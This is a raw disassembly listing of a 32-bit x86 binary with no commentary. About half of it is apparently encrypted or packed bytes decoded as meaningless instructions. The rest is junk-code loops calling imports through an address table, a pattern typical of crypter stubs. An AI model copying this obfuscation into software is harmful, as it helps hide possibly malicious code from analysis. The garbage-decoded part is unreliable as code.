  41b288:	or     eax,0xbe1e599a
  41b28d:	sub    eax,0x9b2fbcbd
  41b292:	in     al,dx
  41b293:	(bad)  
  41b294:	sub    ebx,DWORD PTR [ecx]
  41b296:	sbb    eax,0x149c1deb
  41b29b:	mov    ss,WORD PTR ds:0x904379db
  41b2a1:	(bad)  
  41b2a2:	in     eax,0x43
  41b2a4:	scas   al,BYTE PTR es:[edi]
  41b2a5:	ror    BYTE PTR [edi+0x39],1
  41b2a8:	out    dx,eax
  41b2a9:	sbb    edi,DWORD PTR [esi+0x15264fba]
  41b2af:	push   ss
  41b2b0:	dec    eax
  41b2b1:	clc    
  41b2b2:	push   eax
  41b2b3:	cmp    bh,BYTE PTR [edx+0x26]
  41b2b6:	addr16 cdq 
  41b2b8:	cdq    
  41b2b9:	fwait
  41b2ba:	pop    ebp
  41b2bb:	xlat   BYTE PTR ds:[ebx]
  41b2bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2be:	inc    ebp
  41b2bf:	add    cl,BYTE PTR [esi+0x68]
  41b2c2:	loope  0x41b2af
  41b2c4:	ja     0x41b327
  41b2c6:	cdq    
  41b2c7:	inc    esi
  41b2c8:	pop    edx
  41b2c9:	into   
  41b2ca:	inc    esp
  41b2cb:	popa   
  41b2cc:	jae    0x41b2c4
  41b2ce:	jl     0x41b30f
  41b2d0:	repz jge 0x41b26d
  41b2d3:	mov    eax,ds:0xd344a061
  41b2d8:	jns    0x41b26d
  41b2da:	sub    al,0x9c
  41b2dc:	lods   eax,DWORD PTR ds:[esi]
  41b2dd:	push   esp
  41b2de:	dec    esi
  41b2df:	lods   eax,DWORD PTR ds:[esi]
  41b2e0:	repnz gs dec ecx
  41b2e3:	dec    eax
  41b2e4:	out    dx,eax
  41b2e5:	(bad)  
  41b2e6:	loope  0x41b342
  41b2e8:	mov    ah,0x2f
  41b2ea:	aas    
  41b2eb:	adc    ebx,DWORD PTR [ebp-0x38]
  41b2ee:	jbe    0x41b2c5
  41b2f0:	add    eax,0x7f0430c8
  41b2f5:	dec    eax
  41b2f6:	hlt    
  41b2f7:	push   ebx
  41b2f8:	dec    edx
  41b2f9:	(bad)  
  41b2fa:	enter  0xc154,0xcf
  41b2fe:	sub    al,0x18
  41b300:	mov    eax,ds:0xd87c9f7f
  41b305:	test   BYTE PTR [ecx-0x285a13e7],al
  41b30b:	xor    ch,BYTE PTR [edx+0x75]
  41b30e:	ret    
  41b30f:	dec    ebx
  41b310:	jle    0x41b2e5
  41b312:	popf   
  41b313:	jg     0x41b295
  41b315:	arpl   WORD PTR [ebx],bx
  41b317:	jle    0x41b2e4
  41b319:	loop   0x41b2b5
  41b31b:	mov    eax,ds:0xb5ad6edb
  41b320:	std    
  41b321:	lahf   
  41b322:	dec    ebp
  41b323:	add    bh,al
  41b325:	inc    ebp
  41b326:	xchg   BYTE PTR [ebp-0x2e],dl
  41b329:	and    ecx,ecx
  41b32b:	ins    BYTE PTR es:[edi],dx
  41b32c:	push   edx
  41b32d:	stos   BYTE PTR es:[edi],al
  41b32e:	push   ecx
  41b32f:	call   0x9d02:0x63453773
  41b336:	mov    ds:0x67392132,al
  41b33b:	call   0x1433:0x51c7805
  41b342:	fnstcw WORD PTR [esi]
  41b344:	mov    ah,0xe7
  41b346:	cmp    edx,DWORD PTR [esi-0x666e55a9]
  41b34c:	mov    dh,0x23
  41b34e:	test   DWORD PTR cs:[ebp+0x43],edx
  41b352:	jp     0x41b354
  41b354:	loop   0x41b367
  41b356:	and    al,0xe9
  41b358:	in     al,0x7e
  41b35a:	push   cs
  41b35b:	dec    ebp
  41b35c:	in     eax,dx
  41b35d:	outs   dx,BYTE PTR ds:[esi]
  41b35e:	adc    DWORD PTR [edi],0xad86d192
  41b364:	cs (bad) 
  41b366:	fcompp 
  41b368:	sub    edx,edi
  41b36a:	aad    0x57
  41b36c:	out    0xe6,al
  41b36e:	inc    ecx
  41b36f:	inc    ecx
  41b370:	mov    WORD PTR [esi+edx*2-0x1885c2e7],ss
  41b377:	scas   eax,DWORD PTR es:[edi]
  41b378:	or     al,BYTE PTR [esi+eax*8]
  41b37b:	fdiv   QWORD PTR [edi+0x7f]
  41b37e:	mov    bl,BYTE PTR [edx-0x39d359c8]
  41b384:	mov    bh,dl
  41b386:	sbb    BYTE PTR [ebx+0x66],cl
  41b389:	push   0x457e9cc6
  41b38e:	fisub  WORD PTR [ecx-0x20069fb5]
  41b394:	cld    
  41b395:	(bad)  
  41b397:	mov    ?,WORD PTR [edx+0x517d9c34]
  41b39d:	daa    
  41b39e:	add    ecx,DWORD PTR [esp+eax*2-0x2feab06f]
  41b3a5:	and    eax,0x872a4bbf
  41b3aa:	std    
  41b3ab:	cs pop ss
  41b3ad:	loope  0x41b3e2
  41b3af:	fisttp DWORD PTR es:[ecx-0x41]
  41b3b3:	call   0x853b1d08
  41b3b8:	cmp    eax,0x4a6ce7f
  41b3bd:	inc    edi
  41b3be:	fwait
  41b3bf:	or     BYTE PTR [bp+di-0x4379],bl
  41b3c4:	jle    0x41b393
  41b3c6:	xchg   edi,eax
  41b3c7:	jl     0x41b355
  41b3c9:	mov    bh,0x65
  41b3cb:	mov    dh,0x2d
  41b3cd:	shl    BYTE PTR [esi],1
  41b3cf:	shr    DWORD PTR [edi+0x6feef2b4],cl
  41b3d5:	push   es
  41b3d6:	push   0x155ce0d
  41b3db:	repnz mov dh,0xde
  41b3de:	mov    dl,0x7
  41b3e0:	jmp    0x18e8:0xce745631
  41b3e7:	push   edi
  41b3e8:	adc    DWORD PTR [ecx+0x2047aea4],eax
  41b3ee:	sbb    eax,0x5cbdd890
  41b3f3:	daa    
  41b3f4:	pop    edi
  41b3f5:	xchg   ebx,eax
  41b3f6:	loopne 0x41b46d
  41b3f8:	(bad)  [eax]
  41b3fa:	dec    edi
  41b3fb:	pop    ebp
  41b3fc:	inc    edx
  41b3fd:	pop    edi
  41b3fe:	sub    eax,0xb8cc4a79
  41b403:	cli    
  41b404:	push   es
  41b405:	sub    DWORD PTR [edx+edi*1-0x23],edx
  41b409:	cmp    eax,0xe76ce567
  41b40e:	(bad)  
  41b40f:	dec    ebp
  41b410:	cmp    esp,eax
  41b412:	inc    esi
  41b413:	cmp    ebx,eax
  41b415:	shl    BYTE PTR [ecx],0xf3
  41b418:	mov    ds:0xd900ab46,al
  41b41d:	stc    
  41b41e:	add    eax,0x8db91091
  41b423:	fs inc esp
  41b425:	icebp  
  41b426:	mov    bh,0xbc
  41b428:	dec    ebx
  41b429:	iret   
  41b42a:	fwait
  41b42b:	sub    DWORD PTR [ecx-0x6964f5fb],esi
  41b431:	cmp    BYTE PTR [eax+0x2d59428],ah
  41b437:	and    eax,0x34960ac0
  41b43c:	sub    DWORD PTR [ebp+0x20],eax
  41b43f:	lods   al,BYTE PTR ds:[esi]
  41b440:	push   ds
  41b441:	in     eax,dx
  41b442:	and    eax,0x6be0a455
  41b447:	jmp    0xa22b:0x393cbb4d
  41b44e:	outs   dx,DWORD PTR ds:[esi]
  41b44f:	arpl   WORD PTR [edi],di
  41b451:	mov    edi,0xabb70c67
  41b456:	ds je  0x41b47f
  41b459:	push   eax
  41b45a:	mov    BYTE PTR [ebx+0xb02f441],ah
  41b460:	mov    edx,0xfc18f678
  41b465:	jns    0x41b4ad
  41b467:	sub    ebx,DWORD PTR [edi-0xfbe90d2]
  41b46d:	fidivr DWORD PTR [esi+0x3dc6c300]
  41b473:	sbb    al,0xc4
  41b475:	xchg   esi,eax
  41b476:	dec    esi
  41b477:	inc    edx
  41b478:	scas   al,BYTE PTR es:[edi]
  41b479:	inc    edx
  41b47a:	add    bl,BYTE PTR ds:0xaea26c16
  41b480:	xchg   ebx,eax
  41b481:	mov    ds:0x98bf91b4,eax
  41b486:	push   0x4e
  41b488:	xchg   edi,eax
  41b489:	fisubr DWORD PTR [eax+0x3954cb95]
  41b48f:	jae    0x41b448
  41b491:	(bad)  
  41b492:	and    bh,BYTE PTR [eax+ecx*8-0x7c]
  41b496:	push   0x83de955
  41b49b:	push   es
  41b49c:	aas    
  41b49d:	dec    esi
  41b49e:	fst    QWORD PTR [esi-0x6b5b2d5a]
  41b4a4:	xchg   ebp,eax
  41b4a5:	push   edx
  41b4a6:	aad    0xd5
  41b4a8:	ret    0x8906
  41b4ab:	es pop edx
  41b4ad:	cmp    esp,0x4
  41b4b0:	mov    bh,0x91
  41b4b2:	or     eax,0x2d04ff6c
  41b4b7:	xchg   edi,eax
  41b4b8:	push   0x6c
  41b4ba:	fyl2x  
  41b4bc:	pop    esp
  41b4bd:	idiv   BYTE PTR [esi]
  41b4bf:	stc    
  41b4c0:	mov    edi,0xb4587073
  41b4c5:	rep outs dx,BYTE PTR ds:[esi]
  41b4c7:	popf   
  41b4c8:	adc    ch,BYTE PTR [ebp-0x1e]
  41b4cb:	jb     0x41b450
  41b4cd:	popf   
  41b4ce:	xor    dl,BYTE PTR [edi]
  41b4d0:	stos   DWORD PTR es:[edi],eax
  41b4d1:	mov    bh,0xcf
  41b4d3:	mov    bh,0x97
  41b4d5:	pop    ecx
  41b4d6:	cmp    al,0xcb
  41b4d8:	xchg   esp,eax
  41b4d9:	dec    ebx
  41b4da:	(bad)  
  41b4db:	xchg   edx,eax
  41b4dc:	mov    esp,DWORD PTR [ecx-0x569d699f]
  41b4e2:	or     DWORD PTR [esi+eax*2-0x31b05c93],0x5196d0eb
  41b4ed:	add    ebp,eax
  41b4ef:	push   ebp
  41b4f0:	loope  0x41b4f8
  41b4f2:	mov    bh,0x78
  41b4f4:	jmp    0x41b4ee
  41b4f6:	dec    ebp
  41b4f7:	push   ss
  41b4f8:	lahf   
  41b4f9:	shr    ch,0x14
  41b4fc:	in     eax,0x59
  41b4fe:	fsub   DWORD PTR [ecx-0x70b7a41]
  41b504:	iret   
  41b505:	mov    bl,0xf9
  41b507:	dec    esi
  41b508:	push   0x26
  41b50a:	sbb    BYTE PTR [esi],0x72
  41b50d:	or     DWORD PTR [ecx],ebp
  41b50f:	mov    DWORD PTR [ebp+0x76],edx
  41b512:	jae    0x41b4e5
  41b514:	mov    gs:0x4b8903b1,al
  41b51a:	out    dx,eax
  41b51b:	cmc    
  41b51c:	xchg   ebp,eax
  41b51d:	and    BYTE PTR [edi-0x77],dl
  41b520:	cmp    eax,0x1dcaf0e8
  41b525:	int3   
  41b526:	sar    BYTE PTR [ecx],1
  41b528:	cmp    al,0xfa
  41b52a:	pop    esi
  41b52b:	dec    ebp
  41b52c:	xchg   edx,eax
  41b52d:	mov    ds:0xd8cf8674,eax
  41b532:	cs push 0xffffff8a
  41b535:	rol    DWORD PTR [ebp+0x59241076],cl
  41b53b:	dec    edi
  41b53c:	pop    esi
  41b53d:	into   
  41b53e:	adc    DWORD PTR [ebp+0x7f],ecx
  41b541:	sbb    eax,0x81444c0a
  41b546:	shl    BYTE PTR [eax],cl
  41b548:	dec    ebp
  41b549:	loopne 0x41b4ee
  41b54b:	pop    esp
  41b54c:	sbb    DWORD PTR [ebp-0x1a],0x58
  41b550:	outs   dx,BYTE PTR ds:[esi]
  41b551:	imul   esi,DWORD PTR [ebp-0x247ad2de],0x85b11bce
  41b55b:	jno    0x41b55c
  41b55d:	xlat   BYTE PTR ds:[ebx]
  41b55e:	pop    ss
  41b55f:	std    
  41b560:	adc    al,0x21
  41b562:	aad    0xd5
  41b564:	fwait
  41b565:	xor    DWORD PTR [ebp+0x5dfda4fa],0x33
  41b56c:	and    ecx,edx
  41b56e:	inc    ebx
  41b56f:	in     eax,dx
  41b570:	ds push es
  41b572:	or     al,0xfa
  41b574:	sahf   
  41b575:	sub    eax,0x94c8c705
  41b57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b57b:	pop    es
  41b57c:	hlt    
  41b57d:	cmp    ebx,DWORD PTR [ebx]
  41b57f:	fld    DWORD PTR [edi]
  41b581:	rol    DWORD PTR [ebx+0x3910672a],cl
  41b587:	mov    ebp,0xbb45b2e7
  41b58c:	mov    eax,cs:0x46a710c3
  41b592:	push   0xffffffab
  41b594:	ror    DWORD PTR [ecx],cl
  41b596:	pop    ecx
  41b597:	aas    
  41b598:	cdq    
  41b599:	mov    cl,0x89
  41b59b:	mov    WORD PTR [eax+0x46d4aa85],?
  41b5a1:	sbb    al,dh
  41b5a3:	data16 shl BYTE PTR [ebp-0x40],1
  41b5a7:	adc    al,0xfd
  41b5a9:	and    esp,ebx
  41b5ab:	(bad)  [eax+0x6932b7ed]
  41b5b1:	ja     0x41b5f1
  41b5b3:	outs   dx,BYTE PTR ds:[esi]
  41b5b4:	and    eax,0xe5773aeb
  41b5b9:	mov    ebp,0xc343a207
  41b5be:	in     eax,dx
  41b5bf:	out    dx,al
  41b5c0:	cs in  eax,0xd2
  41b5c3:	imul   eax,DWORD PTR ss:[edi],0x8979097a
  41b5ca:	gs and eax,0xc43fd4cd
  41b5d0:	scas   eax,DWORD PTR es:[edi]
  41b5d1:	ja     0x41b62f
  41b5d3:	icebp  
  41b5d4:	mov    ecx,0x7ec057c5
  41b5d9:	inc    edi
  41b5da:	dec    ebp
  41b5db:	stc    
  41b5dc:	in     al,0xf2
  41b5de:	mov    ecx,0xa5db0435
  41b5e3:	xor    DWORD PTR [ebx],0x42c2d25a
  41b5e9:	inc    edx
  41b5ea:	(bad)  
  41b5eb:	xor    eax,0xe7f23bfe
  41b5f0:	adc    BYTE PTR [ebx],bl
  41b5f2:	push   ss
  41b5f3:	dec    esp
  41b5f4:	or     ecx,DWORD PTR [ecx]
  41b5f6:	add    al,0x36
  41b5f8:	dec    eax
  41b5f9:	jo     0x41b65e
  41b5fb:	retf   0x399e
  41b5fe:	inc    edi
  41b5ff:	and    ecx,DWORD PTR [eax+0x69]
  41b602:	scas   al,BYTE PTR es:[edi]
  41b603:	xchg   edi,eax
  41b604:	cmp    DWORD PTR [edx+0x6b],ebp
  41b607:	enter  0x1c41,0x35
  41b60b:	ror    DWORD PTR [eax-0x1b828714],cl
  41b611:	xor    al,BYTE PTR [esi-0x54]
  41b614:	push   cs
  41b615:	push   ebx
  41b616:	ja     0x41b5a9
  41b618:	mov    cl,0xa3
  41b61a:	mov    edi,0x4b7e1141
  41b61f:	mov    bh,0x9d
  41b621:	cli    
  41b622:	pop    es
  41b623:	outs   dx,DWORD PTR ds:[esi]
  41b624:	sub    bh,BYTE PTR [edx]
  41b626:	sar    DWORD PTR [edx],cl
  41b628:	sub    ebx,esi
  41b62a:	(bad)  
  41b62b:	repz rol DWORD PTR [ebx-0x56a41fb4],cl
  41b632:	call   0x84d5:0xe2a9fb7a
  41b639:	shl    DWORD PTR [ecx],0x6c
  41b63c:	mov    ah,BYTE PTR [esi]
  41b63e:	ins    DWORD PTR es:[edi],dx
  41b63f:	aad    0x2d
  41b641:	test   ebp,edx
  41b643:	pusha  
  41b644:	dec    esi
  41b645:	and    esp,DWORD PTR [esi+eax*4]
  41b648:	adc    ebp,DWORD PTR [eax+0x407cd68e]
  41b64e:	mov    ecx,0x348d6c1b
  41b654:	sub    ebx,DWORD PTR [edx+0x2fa205a2]
  41b65a:	jg     0x41b672
  41b65c:	int    0x36
  41b65e:	or     edx,DWORD PTR [ebp+0x53]
  41b661:	cmp    dl,cl
  41b663:	or     ebp,DWORD PTR [esi+0x6c3d223f]
  41b669:	push   0x74
  41b66b:	dec    esi
  41b66c:	aaa    
  41b66d:	je     0x41b600
  41b66f:	imul   BYTE PTR [esi-0x115abed]
  41b675:	scas   eax,DWORD PTR es:[edi]
  41b676:	or     BYTE PTR [ebx-0x64b00c90],bh
  41b67c:	inc    edi
  41b67d:	scas   eax,DWORD PTR es:[edi]
  41b67e:	out    0x61,al
  41b680:	xor    BYTE PTR [ebx+eiz*8+0x7d],dl
  41b684:	(bad)  
  41b685:	je     0x41b673
  41b687:	lock mov bh,BYTE PTR [esi+0x2d6553c4]
  41b68e:	clc    
  41b68f:	call   0xd989:0x1d8b0339
  41b696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b697:	(bad)  
  41b698:	(bad)  [edi]
  41b69a:	je     0x41b68b
  41b69c:	sub    BYTE PTR [ebp-0x29],0x67
  41b6a0:	daa    
  41b6a1:	pand   mm3,QWORD PTR [ebp+0x344328c7]
  41b6a8:	pop    esi
  41b6a9:	aam    0xd4
  41b6ab:	xchg   BYTE PTR [ecx+0x7a],dl
  41b6ae:	dec    ebx
  41b6af:	ins    BYTE PTR es:[edi],dx
  41b6b0:	out    dx,eax
  41b6b1:	push   es
  41b6b2:	clc    
  41b6b3:	mov    ds:0x73a272a,al
  41b6b8:	adc    esp,DWORD PTR [edx-0x5fd5a708]
  41b6be:	mov    bl,0x50
  41b6c0:	test   al,0x71
  41b6c2:	mov    esi,0xf8d99943
  41b6c7:	test   DWORD PTR [ecx+0x32],ebx
  41b6ca:	stos   DWORD PTR es:[edi],eax
  41b6cb:	aad    0x54
  41b6cd:	sbb    eax,0xe914dc47
  41b6d2:	inc    ecx
  41b6d3:	xchg   esp,eax
  41b6d4:	xor    ch,cl
  41b6d6:	je     0x41b684
  41b6d8:	push   ebx
  41b6d9:	mov    eax,DWORD PTR [edi+0xc43809a]
  41b6df:	fmul   DWORD PTR [ebx-0x46218f66]
  41b6e5:	jl     0x41b764
  41b6e7:	adc    al,BYTE PTR [edi]
  41b6e9:	xor    al,bh
  41b6eb:	(bad)
  41b6ee:	inc    esi
  41b6ef:	pop    ebp
  41b6f0:	sahf   
  41b6f1:	xor    DWORD PTR [edx],edx
  41b6f3:	sbb    esp,DWORD PTR [edx-0x31cea919]
  41b6f9:	adc    BYTE PTR [ebp-0x24733b63],bh
  41b6ff:	add    ch,BYTE PTR [esi-0x47]
  41b702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b703:	(bad)  
  41b704:	enter  0xf9cd,0xfa
  41b708:	popa   
  41b709:	cmp    BYTE PTR [ecx-0x71],0x75
  41b70d:	je     0x41b73b
  41b70f:	xor    bl,BYTE PTR [eax]
  41b711:	(bad)  
  41b712:	pop    esp
  41b713:	mov    dh,0x10
  41b715:	scas   eax,DWORD PTR es:[edi]
  41b716:	or     ah,cl
  41b718:	loope  0x41b725
  41b71a:	jmp    0xfb874446
  41b71f:	iret   
  41b720:	xor    edx,ebx
  41b722:	int    0xb3
  41b724:	ins    BYTE PTR es:[edi],dx
  41b725:	inc    esi
  41b726:	xchg   esp,eax
  41b727:	sbb    eax,DWORD PTR [eax-0x2754eb15]
  41b72d:	dec    ebx
  41b72e:	or     dl,BYTE PTR [eax+ebp*4]
  41b731:	int3   
  41b732:	outs   dx,DWORD PTR ds:[esi]
  41b733:	dec    ecx
  41b734:	adc    ebx,DWORD PTR [ebx-0x7c]
  41b737:	jbe    0x41b79c
  41b739:	in     eax,0xcf
  41b73b:	mov    DWORD PTR [ebp-0x14],ecx
  41b73e:	mov    ecx,DWORD PTR [ebp-0x14]
  41b741:	mov    ecx,DWORD PTR [ecx+0xc]
  41b744:	movsx  cx,BYTE PTR [ecx+eax*1]
  41b749:	mov    edx,0x3b4b
  41b74e:	sub    cx,dx
  41b751:	mov    edx,0x8a85
  41b756:	xor    cx,dx
  41b759:	mov    edx,0x4f85
  41b75e:	cmp    cx,dx
  41b761:	jne    0x419376
  41b767:	mov    ecx,DWORD PTR ds:0x424020
  41b76d:	mov    ecx,DWORD PTR [ecx+0x198]
  41b773:	mov    DWORD PTR [ecx],eax
  41b775:	jmp    0x41b79b
  41b77a:	mov    ecx,DWORD PTR [ebp+0x18]
  41b77d:	cmp    ecx,0xf89c85b5
  41b783:	jne    0x41b79b
  41b789:	push   eax
  41b78a:	push   DWORD PTR [ebp+0x14]
  41b78d:	push   DWORD PTR [ebp+0x10]
  41b790:	push   DWORD PTR [ebp+0xc]
  41b793:	push   DWORD PTR [ebp+0x8]
  41b796:	call   0x416ab7
  41b79b:	pop    edi
  41b79c:	pop    esi
  41b79d:	leave  
  41b79e:	ret    0x14
  41b7a1:	push   ebp
  41b7a2:	mov    ebp,esp
  41b7a4:	sub    esp,0x48
  41b7a7:	push   ebx
  41b7a8:	movzx  eax,BYTE PTR ds:0x42901c
  41b7af:	sub    DWORD PTR ds:0x429010,eax
  41b7b5:	push   esi
  41b7b6:	adc    DWORD PTR ds:0x429000,0x3a05
  41b7c0:	push   edi
  41b7c1:	xor    edi,0x559a
  41b7c7:	xor    esi,esi
  41b7c9:	mov    DWORD PTR [ebp-0x20],esi
  41b7cc:	sub    eax,0x6d46
  41b7d1:	mov    eax,DWORD PTR [ebp-0xc]
  41b7d4:	push   0x5
  41b7d6:	and    DWORD PTR ds:0x42b010,0x0
  41b7e0:	mov    edi,DWORD PTR ds:0x42b010
  41b7e6:	inc    edi
  41b7e7:	mov    DWORD PTR ds:0x42b010,edi
  41b7ed:	cmp    DWORD PTR ds:0x42b010,0x1e
  41b7f4:	jne    0x41b80f
  41b7fa:	push   0x4aeb
  41b7ff:	push   0x362c
  41b804:	push   0x611c
  41b809:	call   DWORD PTR ds:0x425044
  41b80f:	cmp    DWORD PTR ds:0x42b010,0x11
  41b816:	jb     0x41b7e0
  41b81c:	and    DWORD PTR ds:0x429020,0x0
  41b826:	jmp    0x41b838
  41b82b:	mov    edi,DWORD PTR ds:0x429020
  41b831:	inc    edi
  41b832:	mov    DWORD PTR ds:0x429020,edi
  41b838:	cmp    DWORD PTR ds:0x429020,0x1b
  41b83f:	jae    0x41b8d2
  41b845:	cmp    DWORD PTR ds:0x429020,0x5
  41b84c:	jne    0x41b86a
  41b852:	push   0x6d5d
  41b857:	push   0x6bd3
  41b85c:	push   0x2a83
  41b861:	push   DWORD PTR [ebp-0x20]
  41b864:	call   DWORD PTR ds:0x425048
  41b86a:	cmp    DWORD PTR ds:0x429020,0x4
  41b871:	jne    0x41b884
  41b877:	mov    edi,DWORD PTR ds:0x429020
  41b87d:	inc    edi
  41b87e:	mov    DWORD PTR ds:0x429020,edi
  41b884:	jmp    0x41b82b
  41b889:	mov    DWORD PTR ds:0x42901c,0x1a
  41b893:	cmp    DWORD PTR ds:0x42901c,0x0
  41b89a:	je     0x41b8d2
  41b8a0:	cmp    DWORD PTR ds:0x42901c,0x29
  41b8a7:	jne    0x41b8b8
  41b8ad:	push   0x3b9c
  41b8b2:	call   DWORD PTR ds:0x42504c
  41b8b8:	xor    edi,edi
  41b8ba:	or     edi,DWORD PTR ds:0x42901c
  41b8c0:	dec    edi
  41b8c1:	mov    DWORD PTR ds:0x42901c,edi
  41b8c7:	jmp    0x41b893
  41b8cc:	sub    DWORD PTR ds:0x429008,ecx
  41b8d2:	mov    DWORD PTR [ebp-0xc],eax
  41b8d5:	and    DWORD PTR ds:0x42d01c,0x0
  41b8df:	mov    edi,DWORD PTR ds:0x42d01c
  41b8e5:	inc    edi
  41b8e6:	mov    DWORD PTR ds:0x42d01c,edi
  41b8ec:	cmp    DWORD PTR ds:0x42d01c,0x13
  41b8f3:	jne    0x41b909
  41b8f9:	push   0x8e10
  41b8fe:	push   0x42452a
  41b903:	call   DWORD PTR ds:0x425010
  41b909:	cmp    DWORD PTR ds:0x42d01c,0x11
  41b910:	jb     0x41b8df
  41b916:	pop    edi
  41b917:	push   0x424134
  41b91c:	sub    DWORD PTR ds:0x42a018,0x42b000
  41b926:	call   DWORD PTR ds:0x425024
  41b92c:	adc    DWORD PTR ds:0x42c014,0x59ac
  41b936:	push   esi
  41b937:	xor    DWORD PTR ds:0x42d018,0x57bc
  41b941:	push   0x2
  41b943:	add    DWORD PTR ds:0x42a014,0x11b6
  41b94d:	push   0x1
  41b94f:	push   0x2
  41b951:	and    DWORD PTR ds:0x42d004,0x42a01c
  41b95b:	push   0x1
  41b95d:	and    DWORD PTR ds:0x42a004,0x42b014
  41b967:	push   0x8678768
  41b96c:	sbb    DWORD PTR ds:0x42901c,0x42c014
  41b976:	push   0x87676776
  41b97b:	sub    DWORD PTR ds:0x42a008,0x42c014
  41b985:	call   DWORD PTR ds:0x425000
  41b98b:	push   esi
  41b98c:	push   0x68
  41b98e:	push   0xd
  41b990:	push   0x5
  41b992:	push   0x3
  41b994:	push   0x5468787
  41b999:	sub    DWORD PTR ds:0x429014,0x2577
  41b9a3:	call   DWORD PTR ds:0x425008
  41b9a9:	xor    DWORD PTR ds:0x42c00c,0x43e8
  41b9b3:	dec    edi
  41b9b4:	mov    DWORD PTR ds:0x42d008,0x724a
  41b9be:	jne    0x41b917
  41b9c4:	push   0x424148
  41b9c9:	push   esi
  41b9ca:	push   esi
  41b9cb:	call   DWORD PTR ds:0x425038
  41b9d1:	or     DWORD PTR ds:0x42b004,0x42b00c
  41b9db:	test   eax,eax
  41b9dd:	je     0x41ba3c
  41b9e3:	add    DWORD PTR ds:0x429008,edx
  41b9e9:	mov    eax,ds:0x75687681
  41b9ee:	and    DWORD PTR ds:0x429024,0x0
  41b9f8:	mov    ebx,DWORD PTR ds:0x429024
  41b9fe:	inc    ebx
  41b9ff:	mov    DWORD PTR ds:0x429024,ebx
  41ba05:	cmp    DWORD PTR ds:0x429024,0x24
  41ba0c:	jne    0x41ba1e
  41ba12:	push   DWORD PTR [ebp-0x24]
  41ba15:	push   DWORD PTR [ebp-0x18]
  41ba18:	call   DWORD PTR ds:0x425018
  41ba1e:	cmp    DWORD PTR ds:0x429024,0x1e
  41ba25:	jb     0x41b9f8
  41ba2b:	add    DWORD PTR ds:0x42d000,ebx
  41ba31:	imul   eax,eax,0x5463da19
  41ba37:	mov    ds:0x75687681,eax
  41ba3c:	not    eax
  41ba3e:	mov    eax,DWORD PTR [ebp-0xc]
  41ba41:	mov    ebx,DWORD PTR ds:0x42b010
  41ba47:	mov    ebx,0xf89c85b6
  41ba4c:	cmp    eax,ebx
  41ba4e:	mov    DWORD PTR ds:0x42d01c,0x2eca
  41ba58:	jne    0x41baa0
  41ba5e:	add    DWORD PTR ds:0x429018,0x42a018
  41ba68:	mov    DWORD PTR ds:0x424130,0xf89c85b5
  41ba72:	or     DWORD PTR ds:0x42b01c,0x42c010
  41ba7c:	push   DWORD PTR [ebp+0x10]
  41ba7f:	push   DWORD PTR [ebp+0xc]
  41ba82:	push   DWORD PTR [ebp+0x8]
  41ba85:	call   0x408413
  41ba8a:	adc    edi,edi
  41ba8c:	mov    ecx,DWORD PTR ds:0x424020
  41ba92:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41ba98:	sbb    esi,0x7064
  41ba9e:	mov    DWORD PTR [ecx],eax
  41baa0:	mov    DWORD PTR [ebp-0x4],ebx
  41baa3:	add    esi,0x7033
  41baa9:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bab0:	and    DWORD PTR ds:0x42d000,0x0
  41baba:	jmp    0x41bace
  41babf:	xor    ecx,ecx
  41bac1:	add    ecx,DWORD PTR ds:0x42d000
  41bac7:	inc    ecx
  41bac8:	mov    DWORD PTR ds:0x42d000,ecx
  41bace:	cmp    DWORD PTR ds:0x42d000,0x1d
  41bad5:	jae    0x41bb24
  41badb:	cmp    DWORD PTR ds:0x42d000,0x9
  41bae2:	jne    0x41bafb
  41bae8:	push   0x42b01c
  41baed:	push   DWORD PTR [ebp-0x1c]
  41baf0:	push   0x424436
  41baf5:	call   DWORD PTR ds:0x42501c
  41bafb:	cmp    DWORD PTR ds:0x42d000,0x8
  41bb02:	jne    0x41bb15
  41bb08:	mov    ecx,DWORD PTR ds:0x42d000
  41bb0e:	inc    ecx
  41bb0f:	mov    DWORD PTR ds:0x42d000,ecx
  41bb15:	jmp    0x41babf
  41bb1a:	mov    DWORD PTR ds:0x42a01c,0x231b
  41bb24:	lea    eax,[ebp-0x28]
  41bb27:	and    DWORD PTR ds:0x42c008,0x0
  41bb31:	mov    edi,DWORD PTR ds:0x42c008
  41bb37:	inc    edi
  41bb38:	mov    DWORD PTR ds:0x42c008,edi
  41bb3e:	cmp    DWORD PTR ds:0x42c008,0x17
  41bb45:	jne    0x41bb59
  41bb4b:	push   0x42a00c
  41bb50:	push   DWORD PTR [ebp-0x18]
  41bb53:	call   DWORD PTR ds:0x425020
  41bb59:	cmp    DWORD PTR ds:0x42c008,0x10
  41bb60:	jb     0x41bb31
  41bb66:	and    DWORD PTR ds:0x42900c,0x0
  41bb70:	jmp    0x41bb84
  41bb75:	xor    ecx,ecx
  41bb77:	or     ecx,DWORD PTR ds:0x42900c
  41bb7d:	inc    ecx
  41bb7e:	mov    DWORD PTR ds:0x42900c,ecx
  41bb84:	cmp    DWORD PTR ds:0x42900c,0x1b
  41bb8b:	jae    0x41bc1f
  41bb91:	cmp    DWORD PTR ds:0x42900c,0x20
  41bb98:	jne    0x41bba7
  41bb9e:	push   DWORD PTR [ebp-0x14]
  41bba1:	call   DWORD PTR ds:0x425028
  41bba7:	jmp    0x41bb75
  41bbac:	mov    DWORD PTR ds:0x42b00c,0x15
  41bbb6:	cmp    DWORD PTR ds:0x42b00c,0x0
  41bbbd:	je     0x41bc1f
  41bbc3:	cmp    DWORD PTR ds:0x42b00c,0x4
  41bbca:	jne    0x41bbf1
  41bbd0:	push   0x6080
  41bbd5:	push   DWORD PTR [ebp-0x20]
  41bbd8:	push   0x42d004
  41bbdd:	push   0x710d
  41bbe2:	push   DWORD PTR [ebp-0x10]
  41bbe5:	push   DWORD PTR [ebp-0x14]
  41bbe8:	push   DWORD PTR [ebp-0x24]
  41bbeb:	call   DWORD PTR ds:0x42502c
  41bbf1:	cmp    DWORD PTR ds:0x42b00c,0x5
  41bbf8:	jne    0x41bc0d
  41bbfe:	xor    edi,edi
  41bc00:	add    edi,DWORD PTR ds:0x42b00c
  41bc06:	dec    edi
  41bc07:	mov    DWORD PTR ds:0x42b00c,edi
  41bc0d:	mov    edi,DWORD PTR ds:0x42b00c
